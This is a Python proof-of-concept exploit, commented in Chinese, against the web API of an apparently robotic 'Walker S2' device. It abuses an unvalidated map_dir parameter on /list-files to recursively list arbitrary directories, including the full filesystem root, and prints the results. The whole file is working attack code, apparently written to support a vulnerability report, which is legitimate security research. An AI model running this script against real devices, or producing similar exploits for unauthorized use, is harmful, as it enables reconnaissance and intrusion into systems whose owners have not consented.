#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Walker S2 · /list-files 任意递归列目录 PoC（只读）

用法:
    python list_files_poc.py                        # 列 /tmp（默认）
    python list_files_poc.py --map-dir /            # 全盘文件树（报告曾提取 60,040 条）
    python list_files_poc.py --map-dir /etc/walker  # 列 /etc/walker

原理:
    GET /list-files?map_dir=<任意>&is_map_folder=true，map_dir 未做白名单/前缀校验。
"""
import argparse
import json
import sys

import requests

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass


def main():
    ap = argparse.ArgumentParser(description="/list-files 任意递归列目录")
    ap.add_argument("--host", default="192.168.11.3")
    ap.add_argument("--map-dir", default="/tmp", help="要列的目录（默认 /tmp）")
    ap.add_argument("--max", type=int, default=50, help="最多打印多少条（默认 50）")
    ap.add_argument("--raw", action="store_true", help="打印原始 JSON 响应")
    args = ap.parse_args()

    base = f"http://{args.host}:5000"
    params = {"map_dir": args.map_dir, "is_map_folder": "true"}
    print("=" * 66)
    print("[*] 漏洞   : /list-files 任意递归列目录")
    print(f"[*] 目标   : {base}/list-files")
    print(f"[*] 参数   : map_dir={args.map_dir!r}  is_map_folder=true")
    print("=" * 66)
    print(f"\n[>] GET {base}/list-files")

    r = requests.get(f"{base}/list-files", params=params, timeout=15)
    print(f"[<] HTTP {r.status_code}  size={len(r.content)}B")
    print()

    if args.raw:
        print(r.text[:2000])
        return

    try:
        j = r.json()
    except Exception:
        print(r.text[:500])
        return

    # 响应结构: 可能是 {"data":[...]} 或 {"file_list":[...]}，自适应打印
    data = j.get("data") if isinstance(j, dict) else j
    if data is None:
        data = j
    # 可能是 {files:[...]} / {paths:[...]}
    for k in ("files", "paths", "items", "list", "children", "file_list"):
        if isinstance(data, dict) and k in data:
            data = data[k]
            break

    if isinstance(data, list):
        print(f"[*] 共 {len(data)} 条（显示前 {min(len(data), args.max)} 条）:")
        for item in data[: args.max]:
            if isinstance(item, dict):
                name = item.get("name") or item.get("path") or item.get("filename")
                typ = item.get("type", "")
                size = item.get("size", "")
                print(f"    {name}  {typ} {size}".rstrip())
            else:
                print(f"    {item}")
        if len(data) > args.max:
            print(f"    ... 其余 {len(data)-args.max} 条省略")
    else:
        print(f"[*] 原始 data: {json.dumps(data, ensure_ascii=False)[:1000]}")


if __name__ == "__main__":
    main()
